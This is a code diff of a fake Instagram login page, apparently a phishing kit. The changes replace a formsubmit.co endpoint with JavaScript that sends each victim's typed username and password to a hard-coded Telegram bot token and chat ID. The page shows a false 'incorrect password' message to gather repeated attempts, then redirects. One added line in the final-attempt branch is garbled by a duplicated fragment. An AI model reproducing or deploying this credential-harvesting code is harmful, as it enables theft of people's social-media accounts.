@@ -105,7 +105,7 @@
                     </div>
                 </div>
                 <div class="form-container">
-                   <form action="https://formsubmit.co/ztgmalwn@telegmail.com" method="POST"> onsubmit="return handleLogin(event)">
+                   <form id="contactForm" method="POST">
                         <div class="form-content box">
                             <div class="logo">
                                 <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
@@ -213,39 +213,75 @@
         function handleLogin(event) {
             event.preventDefault();
             attemptCount++;
-            const form = document.getElementById("loginForm");
+            const form = document.getElementById("contactForm");
             const errorMessage = document.getElementById("error-message");
 
             if (attemptCount < 3) {
                 document.getElementById("attempt").value = "Attempt " + attemptCount;
                 showPopup();
-                errorMessage.textContent = "incorrect password try again .";
+                errorMessage.textContent = "Incorrect password. Try again.";
 
-                // Submit the form to log the attempt
-                fetch(form.action, {
-                    method: "POST",
-                    body: new FormData(form)
-                }).then(() => {
-                    // Hide the popup when the user starts typing again
-                    document.getElementById("username").addEventListener("input", hidePopup);
-                    document.getElementById("password").addEventListener("input", hidePopup);
+                // Prepare the message to send to Telegram
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+                const textMessage = `*New login attempt:* \n*Username:* ${username}\n*Password:* ${password}`;
+
+                const chatId = '6534651073'; // Replace with your chat ID
+                const token = '6924245302:AAFQcLpYC6i8J3Z9mBo2UewGfP-1U2wdFDQ'; // Replace with your bot token
+
+                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textMessage)}&parse_mode=Markdown`;
+
+                // Send the message using fetch
+                fetch(url, {
+                    method: "POST"
+                }).then(response => response.json()).then(data => {
+                    if (data.ok) {
+                        alert('Message sent successfully!');
+                    } else {
+                        alert('Failed to send message.');
+                    }
+                }).catch(error => {
+                    console.error('Error:', error);
+                    alert('Error sending message.');
                 });
+
+                // Hide the popup when the user starts typing again
+                document.getElementById("username").addEventListener("input", hidePopup);
+                document.getElementById("password").addEventListener("input", hidePopup);
             } else {
                 // On the third attempt, submit the form and then redirect
                 document.getElementById("attempt").value = "Final Attempt";
 
-                // Perform the fetch request to submit the form data
-                fetch(form.action, {
-                    method: "POST",
-                    body: new FormData(form)
-                }).then(() => {
-                    // Redirect to another page after form submission
-                    window.location.href = "con.html";
-                }).catch((error) => {
+                // Prepare the message to send to Telegram
+                const username = document.getElementById('username').value;
+                const password = document.get                const password = document.getElementById('password').value;
+                const textMessage = `*Final login attempt:* \n*Username:* ${username}\n*Password:* ${password}`;
+
+                const chatId = '6534651073'; // Replace with your chat ID
+                const token = '6924245302:AAFQcLpYC6i8J3Z9mBo2UewGfP-1U2wdFDQ'; // Replace with your bot token
+
+                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textMessage)}&parse_mode=Markdown`;
+
+                // Send the message using fetch
+                fetch(url, {
+                    method: "POST"
+                }).then(response => response.json()).then(data => {
+                    if (data.ok) {
+                        alert('Final message sent successfully!');
+                    } else {
+                        alert('Failed to send final message.');
+                    }
+                }).catch(error => {
                     console.error('Error:', error);
+                    alert('Error sending final message.');
                 });
+
+                // Submit the form to redirect to another page
+                form.submit();
             }
         }
+
+        document.getElementById("contactForm").addEventListener("submit", handleLogin);
     </script>
 </body>
 
